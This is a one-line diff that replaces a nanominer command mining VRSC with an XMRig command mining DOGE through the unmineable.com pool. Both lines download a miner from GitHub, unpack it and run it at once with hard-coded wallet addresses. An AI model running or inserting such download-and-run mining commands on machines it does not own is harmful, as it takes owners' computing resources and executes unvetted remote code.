@@ -1,1 +1,1 @@
-wget https://github.com/nanopool/nanominer/releases/download/v3.6.3/nanominer-linux-3.6.3.tar.gz && tar -xf nanominer-linux-3.6.3.tar.gz && cd nanominer-linux-3.6.3 && chmod +x nanominer  && ./nanominer -algo Verushash -wallet RBkULgZSuJDiFg3X4h7mxmn6fFCmscQDrn.thn2 -coin VRSC -pool1 eu.luckpool.net:3956 -t 48
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.1/xmrig-6.19.1-linux-x64.tar.gz && tar -xvf xmrig-6.19.1-linux-x64.tar.gz && cd xmrig-6.19.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DM2BCzYLTTsXroTc9K43DaWmyNYDf5aXhg.n10 -p x
